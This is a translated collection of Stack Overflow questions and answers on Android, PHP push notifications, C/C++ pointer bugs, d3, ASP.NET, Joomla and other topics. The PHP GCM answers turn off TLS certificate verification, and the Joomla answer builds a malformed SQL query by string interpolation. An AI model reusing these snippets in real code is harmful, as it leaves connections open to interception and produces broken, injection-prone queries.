> 时间：2014-06-09T18:06:31.743

如果您使用 Demandware 的 Build Suite，您可以让它在构建过程中连接空格。

您可以在此处找到有关构建套件的信息：[https](https://bitbucket.org/demandware/build-suite) ://bitbucket.org/demandware/build-suite （私人仓库）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-31T17:32:48.600

[Moku](http://www.mokucollective.com/)已成功使用[html-minifier](https://www.npmjs.com/package/html-minifier)包压缩模板文件以删除[sheplers.com](http://www.sheplers.com/)上的空白。我们将它添加到基于 Site Genesis 构建脚本的 gulp 进程中。（大约在 2015 年末）因为我们使用的是 gulp，所以我们使用了 gulp 包装器包[gulp-htmlmin](https://www.npmjs.com/package/gulp-htmlmin)。gulp 任务如下所示：

```
gulp.task('isml', function() {
    var htmlminOptions = {
    collapseWhitespace: true,
    includeAutoGeneratedTags: false
    };

    paths.isml.forEach(function(p) {
        gulp.src(path.join(rootPath, p), { base: './' })
            .pipe(htmlmin(htmlminOptions))
            .pipe(gulp.dest('./'));
    });
}); 
```

的`package.json`路径指令`isml`如下所示。请注意，您可以将任何生成过多空格的 ISML 文件添加到此列表中，但我们发现大多数有问题的空格仅由该文件生成。

```
"isml" : [
  "app_storefront_core/cartridge/templates/default/util/modules.isml"
] 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-12-03T15:52:42.557

我假设您正在使用他们的[Demandware Commerce](http://www.demandware.com/Demandware-Commerce/demandware_product,default,pg.html)或他们的另一项服务。由于他们为其电子商务网站提供了所有后端代码，因此您*极*不可能淡化他们的“空白”。如果您在他们自己的主页上查看源代码，您还会看到大量额外的“空白”。这只是他们的内容管理系统的产品。

您只是担心页面的额外开销（文件大小）还是有其他顾虑？

# java - 如何在使用 json 解析器中获取图像

> ID：13599105
> 
> 赞同：0
> 
> 时间：2012-11-28T06:28:02.160
> 
> 标签：java, android, json, image

我已经完成了用于获取网站内容的 json 解析器，我的第一页在列表视图中显示了几个工作列表，其中应该只包含 id、日期和作者姓名，单击单项列表后，我应该获取图像和数据内容，我我能够获取内容，但我不知道如何在单个项目列表中获取图像。有人知道怎么做吗？

```
public class AndroidJSONParsingActivity extends ListActivity {

// url to make request
private static String url = "http://www.mysite.com/jobs/?json=get_recent_posts";

// JSON Node names
private static final String TAG_POSTS = "posts";
private static final String TAG_ID = "id";
private static final String TAG_TITLE = "title";
private static final String TAG_DATE = "date";
private static final String TAG_CONTENT = "content";
private static final String TAG_AUTHOR = "author";
private static final String TAG_NAME = "name";

// contacts JSONArray
JSONArray posts = null;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    // Hashmap for ListView
    ArrayList<HashMap<String, String>> contactList = new ArrayList<HashMap<String, String>>();

    // Creating JSON Parser instance
    JSONParser jParser = new JSONParser();

    // getting JSON string from URL
    JSONObject json = jParser.getJSONFromUrl(url);

    try {
        // Getting Array of Contacts
        posts = json.getJSONArray(TAG_POSTS);

        // looping through All Contacts
        for(int i = 0; i < posts.length(); i++){
            JSONObject c = posts.getJSONObject(i);

            // Storing each json item in variable
            String id = c.getString(TAG_ID);
            String title = c.getString(TAG_TITLE);
            String date = c.getString(TAG_DATE);
            String content = c.getString(TAG_CONTENT);

            // Phone number is agin  JSON Object
            JSONObject author = c.getJSONObject(TAG_AUTHOR);
            String name = author.getString(TAG_NAME);

            // creating new HashMap
            HashMap<String, String> map = new HashMap<String, String>();

            // adding each child node to HashMap key => value
            map.put(TAG_ID, id);
            map.put(TAG_TITLE, title);
            map.put( TAG_DATE, date);
            map.put( TAG_NAME, name);
            map.put( TAG_CONTENT, content);
            // adding HashList to ArrayList
            contactList.add(map);
        }
    } catch (JSONException e) {
        e.printStackTrace();
    }

    /**
     * Updating parsed JSON data into ListView
     * */
    ListAdapter adapter = new SimpleAdapter(this, contactList,
            R.layout.list_item,
            new String[] { TAG_TITLE, TAG_DATE, TAG_NAME, TAG_CONTENT }, new int[] {
                    R.id.name, R.id.email,R.id.mobile,R.id.content});

    setListAdapter(adapter);

    // selecting single ListView item
    ListView lv = getListView();

    // Launching new screen on Selecting Single ListItem
    lv.setOnItemClickListener(new OnItemClickListener() {

        public void onItemClick(AdapterView<?> parent, View view,
                int position, long id) {
            // getting values from selected ListItem
            String title = ((TextView) view.findViewById(R.id.name)).getText().toString();
            String date = ((TextView) view.findViewById(R.id.email)).getText().toString();
            String name = ((TextView) view.findViewById(R.id.mobile)).getText().toString();
            String content = ((TextView) view.findViewById(R.id.content)).getText().toString();

            // Starting new intent
            Intent in = new Intent(getApplicationContext(), SingleMenuItemActivity.class);
            in.putExtra(TAG_TITLE, title);
            in.putExtra(TAG_DATE, date);
            in.putExtra(TAG_NAME, name);
            in.putExtra(TAG_CONTENT, content);
            startActivity(in);

        }
    }); 
```

单一菜单列表的代码

公共类 SingleMenuItemActivity 扩展活动 {

```
// JSON node keys
private static final String TAG_TITLE = "title";
private static final String TAG_DATE = "date";
private static final String TAG_NAME = "name";
private static final String TAG_CONTENT = "content";
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.single_list_item);

    // getting intent data
    Intent in = getIntent();

    // Get JSON values from previous intent
    String title = in.getStringExtra(TAG_TITLE);
    String date = in.getStringExtra(TAG_DATE);
    String name = in.getStringExtra(TAG_NAME);
    String content = in.getStringExtra(TAG_CONTENT);

    // Displaying all values on the screen
    TextView lblName = (TextView) findViewById(R.id.name_label);
    TextView lblCost = (TextView) findViewById(R.id.email_label);
    TextView lblDesc = (TextView) findViewById(R.id.mobile_label);
    TextView lblCont = (TextView) findViewById(R.id.content_label);

    lblName.setText(title);
    lblCost.setText(date);
    lblDesc.setText(name);
    lblCont.setText(content);
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T20:45:04.663

Once you download the image , use createScaledBitmap (Bitmap src, int dstWidth, int dstHeight, boolean filter) or, for Android2.2 and up, use Bitmap extractThumbnail (Bitmap source, int width, int height) to create thumbnail of the image.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T09:18:31.540

该图像将有一个 Web 链接，您可以从以下代码下载 Web 图像。

```
public static Drawable LoadImageFromWebOperations(String url) {
  try {
    InputStream is = (InputStream) new URL(url).getContent();
    Drawable d = Drawable.createFromStream(is, "src name");
    return d;
} catch (Exception e) {
    return null;
 }
} 
```

# php - PHP：如何在一篇文章中向多个设备发送 GCM 通知

> ID：13599110
> 
> 赞同：2
> 
> 时间：2012-11-28T06:28:40.073
> 
> 标签：php, android, push-notification, google-cloud-messaging

我是一名 android 开发人员，目前使用 PHP 在 GCM 服务器端工作。从我的客户端，我将 gcm 响应令牌存储在一个数据库中，现在我想一次性向注册用户发送消息。我不知道该怎么做，我完全糊涂了。我的简单 HTML 文件是：

```
<html>
<head>
<title>
GCM
</title>
</head>
<body topmargin="50" leftmargin="50" CLASS = "bg">
<form action="send_message.php" name="myform" method="post">
<h4>Admin for sending notificaion to the registered user</h4>
Notification Text: <input name="appText" size="15" type="text"/><br>
URL: <input name="url" size="15" type="text" /><br>
<button type="submit">Submit</button>
</form>
</body>
</html> 
```

而且，我的 send_message.php：

```
<?php
error_reporting (0);

$link = mysql_connect("localhost","db","db"); 
if (!$link) 
 { 
 die(mysql_error()) ; 
 } 
mysql_select_db("gcm_user")or die(mysql_error());
........................................
.....................................
.....................................
?> 
```

现在，在 php 文件中我应该做什么，我已经尝试过这个链接[Android Hive example](http://www.androidhive.info/2012/10/android-push-notifications-using-google-cloud-messaging-gcm-php-and-mysql/)

只是，现在通过这个链接。请建议我如何使用此解决方案解决我的问题。[我的问题的新链接。](http://labs.distriqt.com/post/1273)

但我只想要一个 php 用于我的目的。请帮助克服这个 prm。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-30T06:24:55.377

回答我自己的问题。这是我为满足我的要求所做的。

```
$gcm_text = $_POST['gcmText'];
$gcm_url = $_POST['gcmURL'];
$gcm_subText = $_POST['gcm_secondText'];

$sql = "select gcm_response_token as regId from GCM";
$result = mysql_query($sql);

while ($row = mysql_fetch_assoc($result)) {
    $gcm_array[]=$row['regId'];
    $counter++;
}

mysql_free_result($result);

    $body['allsearch'] = array(
            'gcmText' => $gcm_text,
            'gcm_secondText' => $gcm_subText,
            'gcmURL' => $gcm_url
            );

    // Set POST variables
  $url = 'https://android.googleapis.com/gcm/send';

  $fields = array(
 'registration_ids' => $gcm_array,
 'data' => $body,
 );

//echo GOOGLE_API_KEY;
 $headers = array(
 'Authorization: key=$apiKey',
  'Content-Type: application/json'
 );

print_r($headers);
// Open connection
$ch = curl_init();

// Set the url, number of POST vars, POST data
curl_setopt($ch, CURLOPT_URL, $url);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Disabling SSL Certificate support temporarly
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));

// Execute post
$result = curl_exec($ch);
if ($result === FALSE) {
    die('Curl failed: ' . curl_error($ch));
}

// Close connection
curl_close($ch);
echo $result;

?> 
```

通过这种方式，我能够将 json 数据发送到客户端并获得通知。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T08:02:22.403

这些链接似乎使 PHP 过于复杂。您要做的就是用查询中的值填充该 $registrationIDs 数组。我不是 PHP 专家，但我使用了经常引用的 CURL 示例并准备了如下语句：

```
 $ttl = 86400;
   $randomNum=rand(10,100); 
   $registrationIDs = array();
   .....

   $queryregid = "select regid from registrations where  YOUR SPECIFIC CRITERIA......";
   if (!($stmt = $mysqli->prepare( $queryregid))) {
      echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error; }
   if (!$stmt->execute()) {  
      echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error; }
   if (!$stmt->bind_result($dev_i)){  
      echo "bind failed: (" . $stmt->errno . ") " . $stmt->error;  }

   /* fetch values */
   while ($stmt->fetch()) {
      $regidOne =  $dev_i;
      $registrationIDs[] = $regidOne; // Fill the array
   }
   $stmt->close();

   $fields = array(
           'registration_ids' => $registrationIDs,
             'data' => array( "message" => $message),
             'delay_while_idle'=> false,
             'time_to_live' => $ttl,
             'collapse_key'=>"".$randomNum.""
            );
   $headers = array(
        'Authorization: key=' . $apiKey,
         'Content-Type: application/json'
         );

   // Open connection
   $ch = curl_init();

   // Set the url, number of POST vars, POST data
  curl_setopt( $ch, CURLOPT_URL, $url );
  curl_setopt( $ch, CURLOPT_POST, true );
  curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode( $fields ));

   // Execute post
   $result = curl_exec($ch);
   // Close connection
   curl_close($ch); 
```

.

# c++ - 访问结构数组时打印的垃圾数据

> ID：13599114
> 
> 赞同：1
> 
> 时间：2012-11-28T06:29:09.270
> 
> 标签：c++, malloc

我正在尝试运行以下代码，但它在访问结构数组值时为我提供了垃圾数据。为什么会发生这种情况，我该如何解决？一旦我将 malloc 部分移动到 main 函数，它似乎就可以工作了。但我想将 malloc 保留在一个单独的函数中。

```
#include <cstdlib>
#include <limits>
#include <iostream>
using namespace std;

/*
 *
 */
typedef struct{
    float x;
    float y;
} CoordinateData;

void tester(CoordinateData* cd_data){
    cd_data = (CoordinateData*)malloc(5*sizeof(CoordinateData));
    CoordinateData data = {41.2525,74.0744};
    *cd_data = data;

}
int main(int argc, char** argv) {

    CoordinateData* cd_data;
    tester(cd_data);
    std::cout << (*cd_data).x << "::" << (*cd_data).y << std::endl;
} 
```

我得到的输出是 2.42126e-39::-1.51015e-05 预期的输出是 41.2525::74.0744

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:31:29.960

*按地址*传递 cd_data ，而不是值：

```
void tester(CoordinateData** cd_data)
{
    *cd_data = (CoordinateData*)malloc(5*sizeof(CoordinateData));
    CoordinateData data = {41.2525,74.0744};
    *(*cd_data) = data;
}

int main(int argc, char** argv)
{
    CoordinateData* cd_data = NULL;
    tester(&cd_data);
    std::cout << (*cd_data).x << "::" << (*cd_data).y << std::endl;
    free(cd_data);
    return EXIT_SUCCESS
} 
```

`main()`另请注意，您缺少的返回值。还。这个问题被标记为 C 和 C++。如果是后者，请使用`new`and`delete[]`代替`malloc`and`free`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:30:37.213

因为`malloc`将内存分配给您传递给函数的指针的副本。
传递给函数的指针永远不会被分配任何内存或数据。

您需要**通过引用传递**。

```
//Call function as
tester(&cd_data);

//Function Implementation
void tester(CoordinateData** cd_data)
{
    *cd_data = (CoordinateData*)malloc(5*sizeof(CoordinateData));
    CoordinateData data = {41.2525,74.0744};
    *(*cd_data) = data;
} 
```

# lingo - 有没有一种简单的方法可以将保存游戏菜单添加到 adobe 导演游戏

> ID：13599117
> 
> 赞同：0
> 
> 时间：2012-11-28T06:29:21.183
> 
> 标签：lingo

有没有一种简单的方法可以在不使用 FileIO Xtra 的情况下将保存游戏菜单添加到 adobe director 游戏，这样玩家就可以从上次中断的地方玩游戏。

这是一个点击式游戏，在他们玩游戏时进度会发生变化。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T19:43:03.297

是的！检查`setPref`并`getPref`在手册中。

您可以阅读他们在应用程序启动时停止的点并在关闭游戏之前将其保存。可以使用一些全局变量或对象来跟踪游戏进度。

（当然你需要能够修改代码。）

# javascript - 如何从 d3js 图中的 y 轴刻度中删除小数点

> ID：13599118
> 
> 赞同：5
> 
> 时间：2012-11-28T06:29:21.267
> 
> 标签：javascript, canvas, charts, svg, d3.js

这是我的 d3js 图的链接[http://enjalot.com/inlet/4159384/](http://enjalot.com/inlet/4159384/) 问题是显示年份的 y 轴对于 json 数据具有诸如 2008.5 和 2009.0 之类的值

```
 [{count:200,year:2008},
    {count:240,year:2010},
    {count:290,year:2009}]; 
```

我想显示没有任何小数点的年份。怎么做。下面是我的 d3js 代码

```
 var w = 300,
    h = 300,
    padding = 31,
    p = 10;

var data = [{count:200,year:2008},
    {count:240,year:2010},
    {count:290,year:2009}];

var bar_height = d3.scale.linear()
    .domain(d3.extent(data, function(d) { return d.count; }) )  // min max of count
    .range([p,h-p]);  // min max of area to plot in

var bar_xpos = d3.scale.linear()
    .domain(d3.extent(data, function(d) { return d.year; }) )  // min max of year
    .range([p,w-p]);  // min max of area to plot in

var xAxis = d3.svg.axis()
            .scale(bar_xpos)
            .orient("bottom")
            .ticks(5);  //Set rough # of ticks

var yAxis = d3.svg.axis()
            .scale(bar_height)
            .orient("left")
            .ticks(5);

var svg = d3.select("svg")
    .attr("width", w)
    .attr("height", h);

svg.append("g")
    .attr("class", "axis")
    .attr("transform", "translate(0," + (h - padding) + ")")
    .call(xAxis);

svg.append("g")
    .attr("class", "axis")
    .attr("transform", "translate(" + padding + ",0)")
    .call(yAxis); 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-28T07:16:42.120

查看有关[d3 值格式](https://github.com/mbostock/d3/wiki/Formatting)的文档。

如果你`d3.format()`用来格式化你的轴，你的轴值会看起来好多了。

```
var formatxAxis = d3.format('.0f');

var xAxis = d3.svg.axis()
            .scale(bar_xpos)
            .orient("bottom")
            .tickFormat(formatxAxis)
            .ticks(5); 
```

`.0f`意思是：我想要小数点后*0*
位 的精度，并且我想要*固定*值，即不四舍五入而是截断。

 **但是，您会注意到，由于您将精度固定为小数点后 0 位，因此 2009.5 和 2009.0 都将被格式化为 2009。这意味着两个轴刻度可能具有相同的值。一旦您在多年内拥有足够的数据点，此错误就会消失。**

# asp.net - 当我从后面的代码中添加 Linkbutton 时，单击事件不会调用

> ID：13599121
> 
> 赞同：1
> 
> 时间：2012-11-28T06:29:33.523
> 
> 标签：asp.net

我使用下面`LinkButton`的代码添加代码，但是当我点击每个链接按钮时，点击事件不会调用，但如果我删除`if(!IsPostBack)`工作正常

```
protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            this.sr();
        }//if
    }

    void sr()
    {
        LinkButton lnk;
        for (int i =1; i < 6; i++)
        {
            lnk = new LinkButton();
            lnk.ID="lnk"+i.ToString();
            lnk.Text = i.ToString() + "&nbsp;&nbsp;&nbsp;&nbsp;";
            lnk.Click += new EventHandler(lnk_Click);
            this.pnl.Controls.Add(lnk);
 }
    }

    void lnk_Click(object sender, EventArgs e)
    {
        LinkButton lnk = (LinkButton)sender;
        lnk.Text = "Clicked";
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:45:40.283

您的函数被调用两次，因为它包含在 page_load 和 page_init 中。从 page_load 中删除它。回发将始终查找发生的更改并尝试重建页面，以便每次都重建来自代码后面的控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:34:56.083

您正在动态创建一个**链接按钮**。

您必须在**Page_Init**函数中调用 sr() ，例如...

```
void Page_Init(object Sender, System.EventArgs e)
{
  sr();
} 
```

[请检查这个](http://msdn.microsoft.com/en-us/library/ms178472.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:38:23.610

向页面动态添加控件时，必须在每次加载页面时添加它们。理想情况下，这应该在 Page 初始化事件中完成。这就是您的代码在删除 !Page.IsPostBack 条件时起作用的原因。

# android - 需要 Android TableLayout 分页示例

> ID：13599128
> 
> 赞同：-1
> 
> 时间：2012-11-28T06:30:03.513
> 
> 标签：android, pagination

我想要一个表格分页的工作演示。谁能给我表格分页的链接。[Android 表格分页](https://stackoverflow.com/questions/13525822/table-pagination-table-layout-web-service-using-xml-parser)。

我试过这个链接，但它不起作用。有人可以告诉我如何实现这一目标。我试过[分页布局](https://github.com/paulononaka/Android-PaginationLayoutSample/blob/master/src/com/paulononaka/PaginationLayout.java)

但这不起作用。如果这可行，可以告诉我我提到的程序中的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:48:16.060

我个人会使用 ViewPager 或 View Flipper 进行分页。

该视频展示了如何使用视图翻转器。 [ViewFlipper 示例](http://www.youtube.com/watch?v=9xGIlaezMAU) 只需替换您自己的视图，如 TableRow。

如果你想使用 ViewPager。[Android 文档有示例代码](http://developer.android.com/reference/android/support/v4/view/ViewPager.html)。（编辑：我应该注意 viewPager 需要支持库[这将解释如何安装它。它非常简单](http://developer.android.com/tools/extras/support-library.html)

编辑：这是您的 xml 布局的伪样式。

> ```
> <tableLayout>
>     <viewFlipper>
>        <TableRow>
>         <Button>
>         </TableRow>
> 
>  <TableRow>
>         <Button>
>         </TableRow>
> 
>  <TableRow>
>         <Button>
>         </TableRow>
>  </viewFlipper> 
> ```

```
<TableLayout> 
```

# joomla - 获取模块中的 Joomla 横幅描述

> ID：13599133
> 
> 赞同：3
> 
> 时间：2012-11-28T06:30:38.323
> 
> 标签：joomla

嗨，我想修改默认的 joomla 横幅模块，以便不仅显示横幅图像，还显示已在后端输入的描述文本。你能帮助我吗？谢谢![横幅组件 joomla 后端](../Images/fe4daa86313c1cc0b573f3d8c6cc5875.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T08:34:41.060

如果您使用 default `mod_banner`of `Joomla`，则需要在其中添加一些更改以在要显示它的模块中显示您的描述。

1.  你需要去前端组件，`models`for `com_banners`.Navigation`banners.php`因为它就`components\com_banners\models\banners.php`在这个文件里，`getListQuery`你需要像其他的一样`'a.description as description,'.`在里面添加下面这行代码。`$query->select`这就是这个文件。

2.  现在转到您`modules\mod_banners\tmpl\default.php`并在您尝试时访问该变量描述`echo $item->description`。

**或者**

如果您不想更改核心文件，那么您需要使用**模板覆盖**Joomla 的输出！核。

有关更多详细信息，请访问该链接[如何覆盖 Joomla 的输出！核](http://docs.joomla.org/How_to_override_the_output_from_the_Joomla!_core)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-12T19:48:52.240

这篇文章很旧，但这是答案：

```
<?php 
     /** Description from the Banner  **/
     $db = &JFactory::getDBO();
         $bid = $item->id;
         $sql = "SELECT `description` FROM `rlz1b_banners` WHERE '$bid'"; 
                 /*rlz1b_banners is your database name*/
         $db->setQuery($sql);
         $db->query();
         $res = $db->loadAssocList(); 
?>
<p><?php  echo $res[0][description]; ?></p> 
```

这对于 Joomla 2.5 中的 SEO 友好横幅非常有用。

# javascript - jquery同位素水平元素重叠

> ID：13599134
> 
> 赞同：0
> 
> 时间：2012-11-28T06:30:40.490
> 
> 标签：javascript, jquery, jquery-isotope, horizontal-scrolling

我正在尝试做一个水平同位素，如果你看看下面的小提琴，你会发现问题：

元素重叠...

```
<div class="cal">
<div class="col">
    <div class="head">
        1                
    </div>
    <div class="clear"></div>
    <div class="container">
         <div class="shape">
             <div class="inner-wrapper">
                 <div class="event">
                     <div class="main-avatar">
                         <a href="#">
                             img <p style="display: inline; margin-left: 3px;">name</p>
                         </a>
                     </div>
                     <h5><a href="#">something</a></h5>
                 </div>
                 <p style="padding-bottom: 0px">home</p>
                 <p style="padding-bottom: 0px">9:00 AM-9:00 AM</p>
             </div>
             <div class="">
                 <a href="#">More...</a>
             </div>
        </div>
        <div class="shape">
             <div class="inner-wrapper">
                 <div class="event">
                     <div class="main-avatar">
                         <a href="#">
                             img <p style="display: inline; margin-left: 3px;">name</p>
                         </a>
                     </div>
                     <h5><a href="#">something</a></h5>
                 </div>
                 <p style="padding-bottom: 0px">home</p>
                 <p style="padding-bottom: 0px">9:00 AM-9:00 AM</p>
             </div>
             <div class="">
                 <a href="#">More...</a>
             </div>
        </div>
        <div class="shape">
             <div class="inner-wrapper">
                 <div class="event">
                     <div class="main-avatar">
                         <a href="#">
                             img <p style="display: inline; margin-left: 3px;">name</p>
                         </a>
                     </div>
                     <h5><a href="#">something</a></h5>
                 </div>
                 <p style="padding-bottom: 0px">home</p>
                 <p style="padding-bottom: 0px">9:00 AM-9:00 AM</p>
             </div>
             <div class="">
                 <a href="#">More...</a>
             </div>
        </div>
    </div>                
</div> 
```

[您可以查看和测试的示例](http://jsfiddle.net/XVqkC/2/)

有趣的是，如果你调整窗口的大小，同位素会使元素正确......

这是同位素的错误还是我做错了什么？

任何帮助都会很棒...

谢谢克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:37:54.200

我无法告诉您问题出在哪里，但我注意到它在窗口调整大小时会自行修复，因此我将其添加到您的代码中：

```
$(window).resize(); 
```

[现在它可以工作了](http://jsfiddle.net/XVqkC/3/)。

# jsp - 如何在 JSP 中链接 linux samba 共享文件夹

> ID：13599140
> 
> 赞同：1
> 
> 时间：2012-11-28T06:30:53.257
> 
> 标签：jsp, hyperlink

是否可以在 JSP 中提供 linux samba 共享文件夹链接。通过单击链接共享文件夹必须在 Windows 资源管理器中打开。只需要链接到 jsp 中的共享文件夹。

我试过`SmbFile.getPath()`, `SmbFile.getCannonicalPath()`, `SmbFile.getUniPath()`...但没有成功。它将 url 附加到本地 tomcat 上下文。对此主题的帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:44:20.530

这不是 JSP/SMB 的问题，而是“我可以从 Web 浏览器打开文件夹”的问题，而且 JavaScript 似乎可以：

[从 Web 浏览器打开文件系统文件夹/目录](https://stackoverflow.com/questions/4218018/opening-a-file-system-folder-directory-from-web-browser)

您只需生成 JSP/SMB 代码即可生成此类 JavaScript。

# c# - 将验证器与动态变化的文化 C# 进行比较

> ID：13599144
> 
> 赞同：0
> 
> 时间：2012-11-28T06:31:16.437
> 
> 标签：c#, .net, validation

我想比较开始日期和结束日期，即。开始日期应小于结束日期。我正在动态更改页面文化。但是，比较验证器仅比较 dd/mm/yyyy 格式的日期。

这是我使用的覆盖方法：

```
 protected override void InitializeCulture()
{
    string datetimeculture = "en-US"; // default lang
    if (Session["datetimeculture"] != null)
    {
        datetimeculture = Session["datetimeculture"].ToString();
    }

    this.UICulture = datetimeculture;
    this.Culture = datetimeculture;
    base.InitializeCulture();
} 
```

这是比较验证器

```
<asp:CompareValidator ID="DateCompare" runat="server" ControlToCompare="txtfaredate_to" 
ControlToValidate="txtfaredate_from" ForeColor="Red" Type="Date" Operator="LessThanEqual" display="Dynamic"
CssClass="failureNotification" ErrorMessage="The Fare Date form must not match the Fare Date to."
ValidationGroup="basic">To Date cannot be less than From Date.</asp:CompareValidator> 
```

任何想法如何做到这一点？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:15:54.027

我使用自定义验证器来解决我的问题。

```
<asp:CustomValidator ID="DateCompare" runat="server" ControlToValidate="txtfaredate_to" EnableClientScript="true" ForeColor="Red" display="Dynamic"
 ErrorMessage="To Date cannot be less than From Date." ClientValidationFunction="fncClientCheckDate"></asp:CustomValidator> 
```

客户端代码：

```
 function fncClientCheckDate(sender, args) {
        var todate = dateToYMD(document.getElementById("txtfaredate_to").value);
        var fromdate = dateToYMD(document.getElementById("txtfaredate_from").value);

        if (new Date(todate) < new Date(fromdate))
    {
    args.IsValid = false;
    return;
    }
    args.IsValid = true;
    }
    function dateToYMD(date) {
        var date = new Date(date);
       // alert(date);
        var d = date.getDate();
        var m = date.getMonth() + 1;
        var y = date.getFullYear();
        return '' + y + '-' + (m <= 9 ? '0' + m : m) + '-' + (d <= 9 ? '0' + d : d);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:44:18.050

尝试设置 Validator 控件的 ValueToCompare 属性。像这样的东西：

```
<asp:CompareValidator ID="DateCompare" runat="server" 
   ControlToCompare="txtfaredate_to" 
   ControlToValidate="txtfaredate_from"
   ValueToCompare="<%# DateTime.Now.ToString(\"dd-MM-yyyy\") %>" //adjust to your needs 
   ForeColor="Red" 
   Type="Date" 
   Operator="LessThanEqual" 
   display="Dynamic"
   CssClass="failureNotification" 
   ErrorMessage="The Fare Date form must not match the Fare Date to."
   ValidationGroup="basic">To Date cannot be less than From Date.
</asp:CompareValidator> 
```

# c - 将结构指针传递给函数段错误 C FREEBSD

> ID：13599151
> 
> 赞同：-1
> 
> 时间：2012-11-28T06:32:19.917
> 
> 标签：c, linux, segmentation-fault, freebsd

我正在尝试将我的 C GNU/Linux 代码移植到 FreeBSD。起初我以为它不会编译和运行异常，但它并没有对我起作用，因为它没有使用其他操作系统不具备的功能。尽管它编译得很好（使用 没有错误或警告`-Wall`），但应用程序在 GNU/Linux 安装上按预期正常工作的线路上保持段错误。

我正在做的是创建一个指向结构的指针，然后将指针作为 void 指针传递给函数，然后在函数内重新创建它。

前任：

```
typedef struct
{
   int i;
}some_struct;

int main()
{
   some_struct *test = malloc(sizeof(some_struct));
   test->i = -1;
   function(test);

return 0;
}

void *function(void *prarm)
{
   some_struct test = *((some_struct *)param);  //segfaults on this line.
   free(param);

return NULL;
} 
```

在我的 GNU/Linux 安装上，这将允许我在函数内部本地使用传递的指针数据重新创建结构，并允许我从中释放`malloc`ed 内存，`main()`但在 FreeBSD 上它会出现段错误，我不知道为什么。

如果我闯入`function`并`gdb`输入

```
p *(some_struct *)param 
```

它成功地打印出我的命令结构，该结构是从函数内部的指针及其所有变量创建的。

我对为什么这在我的 FreeBSD 测试机器上运行 GNU/Linux 和段错误感到迷茫。

感谢您对我遇到的这个问题的任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:38:21.507

很奇怪，这会失败。您是否尝试过重新排序函数或`function`在使用前声明（在 main 之前）：

```
void *function(void *prarm); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T07:42:25.273

您正在创建一个*非常*大的堆栈框架：

```
char buff[3000600], data[3000000], url[1024], c[1]; 
```

这几乎是 6MB - 也许您超出了 FreeBSD 上的默认进程堆栈大小限制？FreeBSD 用来`SIGSEGV`杀死一个超过这个限制的进程，当你写入一个会导致堆栈扩展超过限制的局部变量时，它会被检测到。您可以在[`login.conf`](http://www.freebsd.org/cgi/man.cgi?query=login.conf&sektion=5).

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T06:39:23.480

我看不出它有任何发生段错误的理由，尤其`-Wall`是在沉默的情况下。

对此困扰我的一件事是，`function()`在调用`main()`. 如果没有声明，C 假定参数是作为整数传递的，因此应该给出警告。您可以通过多种方式解决此问题——在 main() 之上添加函数声明，将函数定义移至 main 之上，或将声明放在 main() 之前包含的头文件中。

# ruby-on-rails - 如何使我的方法 add_friend 在 rake db:seed 中工作

> ID：13599152
> 
> 赞同：0
> 
> 时间：2012-11-28T06:32:25.043
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rake

我正在关注关于 twitter 克隆、闪烁的 Charles Max Wood 教程。我在`undefined method friendships`启动 rake db:seed 时遇到错误。我正在尝试通过 rake db:seed 任务添加朋友，方法 add_friend 在用户模型中定义。但我需要帮助来定义方法友谊，以便任务能够工作。非常感谢您的帮助。

**这是 db/seeds.rb 文件**

```
require 'faker'
require 'populator'

User.destroy_all

10.times do
  user = User.new
  user.username = Faker::Internet.user_name
  user.email = Faker::Internet.email
  user.password = "test"
  user.password_confirmation = "test"
  user.save
end

User.all.each do |user|  
  Flit.populate(5..10) do |flit|
    flit.user_id = user.id
    flit.message = Faker::Lorem.sentence
  end

  3.times do
    User.add_friend(User.all[rand(User.count)])
  end
end 
```

**并且有用户文件。**

```
class User < ActiveRecord::Base
  # new columns need to be added here to be writable through mass assignment
  attr_accessible :username, :email, :password, :password_confirmation

  attr_accessor :password
  before_save :prepare_password

  validates_presence_of :username
  validates_uniqueness_of :username, :email, :allow_blank => true
